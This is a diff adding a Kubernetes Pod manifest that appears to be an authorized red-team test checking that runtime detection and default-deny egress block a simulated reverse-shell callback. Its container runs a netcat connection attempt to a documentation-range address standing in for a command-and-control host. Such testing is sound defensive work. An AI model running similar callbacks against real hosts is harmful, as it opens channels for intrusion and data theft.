@@ -1,0 +1,56 @@
+---
+# CONTROLLED TEST - authorized self-validation of the Nimbus platform.
+# MITRE ATT&CK for Containers: T1059 Command and Scripting Interpreter.
+# Attempt: spawn an interactive shell and open an outbound connection to an
+# external command-and-control host, the shape of a reverse shell. This pod
+# is fully policy-clean so it passes admission on purpose. The point is that
+# the runtime and network layers, not admission, catch it.
+# Expected outcome: two controls fire. Falco's shell-spawn rule alerts (a
+# shell whose parent is not the image entrypoint), and the default-deny
+# egress NetworkPolicy drops the outbound connection so the C2 callback fails
+# (prints BLOCKED-AS-EXPECTED). The 198.51.100.0/24 destination is TEST-NET-2
+# (RFC 5737), a documentation range that routes nowhere.
+apiVersion: v1
+kind: Pod
+metadata:
+  name: rt-09-reverse-shell
+  namespace: nimbus
+  labels:
+    redteam.nimbus/controlled-test: "true"
+    redteam.nimbus/control-class: network-block
+    app.kubernetes.io/part-of: nimbus-redteam
+  annotations:
+    redteam.nimbus/mitre: T1059
+    redteam.nimbus/mitre-name: Command and Scripting Interpreter
+    redteam.nimbus/control: Falco shell-spawn (detect) + default-deny egress NetworkPolicy (prevent)
+    redteam.nimbus/expected: Network BLOCK + Falco alert - C2 callback is dropped
+spec:
+  restartPolicy: Never
+  containers:
+    - name: attacker
+      image: docker.io/library/busybox:1.37.0
+      command: ["sh", "-c"]
+      args:
+        - |
+          sh -c 'if nc -w 5 198.51.100.10 4444 </dev/null; then
+            echo "C2-REACHABLE-CONTROL-FAILED"
+          else
+            echo "BLOCKED-AS-EXPECTED"
+          fi'
+          sleep 3600
+      securityContext:
+        runAsNonRoot: true
+        runAsUser: 65534
+        allowPrivilegeEscalation: false
+        readOnlyRootFilesystem: true
+        capabilities:
+          drop: [ALL]
+        seccompProfile:
+          type: RuntimeDefault
+      resources:
+        requests:
+          cpu: 25m
+          memory: 32Mi
+        limits:
+          cpu: 100m
+          memory: 64Mi
